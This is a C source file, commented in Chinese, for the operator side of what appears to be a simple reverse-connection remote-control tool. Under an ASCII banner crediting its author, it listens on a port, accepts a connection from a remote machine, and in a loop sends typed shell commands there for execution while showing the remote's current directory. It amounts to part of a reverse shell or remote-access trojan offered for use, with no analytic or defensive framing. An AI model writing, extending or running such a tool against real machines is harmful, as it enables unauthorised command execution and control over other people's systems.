#include "socket.h"
#include "command.h"

// 服务器编写
// 实现反向连接


int main(int argc, char* argv[])
{
	printf("     _                 _                                 _       \n");
	printf(" ___(_)_ __ ___  _ __ | | ___   _ __ ___ _ __ ___   ___ | |_ ___ \n");
	printf("/ __| | '_ ` _ \\| '_ \\| |/ _ \\ | '__/ _ \\ '_ ` _ \\ / _ \\| __/ _ \\\n");
	printf("\\__ \\ | | | | | | |_) | |  __/ | | |  __/ | | | | | (_) | ||  __/\n");
	printf("|___/_|_| |_| |_| .__/|_|\\___| |_|  \\___|_| |_| |_|\\___/ \\__\\___|\n");
	printf("                |_|                                              \n");
	printf("\n");
	printf("          =[ author 麦当 v1.0                                   ]\n");

	// 监听端口
	int port = atoi(argv[1]);
	// 初始化sock
	InitSock();
	// 开启监听
	SOCKET sClient = Listen(port);
	printf("          =[ Listening %-5d                                    ]\n", port);
	// 连接服务器
	SOCKET sServer = Connect(sClient);

	char cmd[255] = { 0 };

	while (TRUE)
	{
		// 获取当前路径
		RecvPath(sServer);
		fflush(stdin);
		printf(">> ");
		gets_s(cmd, 250);
		fflush(stdin);

		// 发送cmd命令
		SendData(sServer, cmd, sizeof(cmd));
		// 执行命令
		ExecCmd(sServer, cmd);

		ZeroMemory(cmd, sizeof(cmd));

		printf("\n");
	}

	// 收尾
	closesocket(sServer);
	closesocket(sClient);
	WSACleanup();
}